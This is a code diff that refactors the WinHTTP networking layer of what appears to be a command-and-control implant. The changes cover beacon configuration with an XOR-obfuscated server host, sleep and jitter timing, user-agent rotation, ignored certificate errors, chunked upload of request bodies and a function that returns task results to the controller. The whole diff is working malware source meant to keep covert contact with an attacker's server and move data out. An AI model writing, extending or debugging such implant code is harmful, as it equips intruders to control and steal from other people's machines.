@@ -28,15 +28,26 @@
 
 namespace net {
 
-static HINTERNET hSession = nullptr;
-static HINTERNET hConnect = nullptr;
+struct C2Config;
+
+// ── WinHTTP Connection State ──────────────────────────────────────────────
+// Encapsulated handles: no static globals, single inline instance.
+struct WinHttpContext {
+    HINTERNET hSession = nullptr;
+    HINTERNET hConnect = nullptr;
+
+    bool ensure(const C2Config& cfg);
+    void cleanup();
+};
+
+inline WinHttpContext g_ctx;
 
 // ── Configuration ──────────────────────────────────────────────────────────
 // These will be patched at compile time or set via config.
 struct C2Config {
     std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
-    int          port      = 443;
-    bool         use_https = false;    // Set to true for production
+    int          port      = 8443;
+    bool         use_https = true;
     int          sleep_ms  = 5000;     // Base sleep interval (ms)
     int          jitter    = 30;       // Jitter percentage (0-100)
     std::string  beacon_id;            // Unique agent identifier
@@ -53,10 +64,9 @@ struct C2Config {
 
 inline std::wstring get_random_ua();
 
-inline void ensure_connection(const C2Config& cfg) {
-    if (hSession && hConnect) return;
+inline bool WinHttpContext::ensure(const C2Config& cfg) {
+    if (hSession && hConnect) return true;
     
-    // Clean up partial handles to prevent leaks
     if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
     if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
     
@@ -75,8 +85,10 @@ inline void ensure_connection(const C2Config& cfg) {
         if (!hConnect) {
             WinHttpCloseHandle(hSession);
             hSession = nullptr;
+            return false;
         }
     }
+    return hSession && hConnect;
 }
 
 // ── User-Agent Rotation ────────────────────────────────────────────────────
@@ -105,22 +117,24 @@ inline std::string http_request(
     const std::string& beacon_id = ""
 ) {
     std::string response_body;
-    ensure_connection(cfg);
-    if (!hSession || !hConnect) return "";
+    if (!g_ctx.ensure(cfg)) return "";
 
     DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;
     HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect,
+        g_ctx.hConnect,
         method.c_str(),
         path.c_str(),
         nullptr,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         flags);
-    if (!hRequest) return "";
+    if (!hRequest) {
+        g_ctx.cleanup();
+        return "";
+    }
 
-    WinHttpSetTimeouts(hRequest, 5000, 5000, 5000, 5000);
-    
+    WinHttpSetTimeouts(hRequest, 15000, 15000, 30000, 30000);
+
     if (cfg.use_https) {
         DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
@@ -149,15 +163,40 @@ BOOL bResult = WinHttpSendRequest(
     hRequest,
     headers.c_str(),
     static_cast<DWORD>(headers.length()),
-    body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
-    static_cast<DWORD>(body.size()),
+    WINHTTP_NO_REQUEST_DATA,
+    0,
     static_cast<DWORD>(body.size()),
     0);
 if (!bResult) {
-    goto cleanup;
+    g_ctx.cleanup();
+    WinHttpCloseHandle(hRequest);
+    return "";
 }
-    bResult = WinHttpReceiveResponse(hRequest, nullptr);
-    if (!bResult) goto cleanup;
+
+// Send body in chunks if present
+if (!body.empty()) {
+    DWORD totalSent = 0;
+    while (totalSent < static_cast<DWORD>(body.size())) {
+        DWORD chunkSize = static_cast<DWORD>(body.size()) - totalSent;
+        if (chunkSize > 65536) chunkSize = 65536;
+        if (!WinHttpWriteData(hRequest,
+                body.c_str() + totalSent,
+                chunkSize,
+                &chunkSize)) {
+            g_ctx.cleanup();
+            WinHttpCloseHandle(hRequest);
+            return "";
+        }
+        totalSent += chunkSize;
+    }
+}
+
+bResult = WinHttpReceiveResponse(hRequest, nullptr);
+    if (!bResult) {
+        g_ctx.cleanup();
+        WinHttpCloseHandle(hRequest);
+        return "";
+    }
 
     {
         DWORD dwSize = 0;
@@ -174,8 +213,7 @@ if (!bResult) {
         } while (dwSize > 0);
     }
 
-cleanup:
-    if (hRequest) WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hRequest);
     return response_body;
 }
 #else
@@ -314,8 +352,12 @@ inline bool send_result(const C2Config& cfg, const std::string& task_id, const s
 }
 
 inline void cleanup() {
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    g_ctx.cleanup();
+}
+
+inline void WinHttpContext::cleanup() {
+    if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
+    if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
 }
 
 }  // namespace net
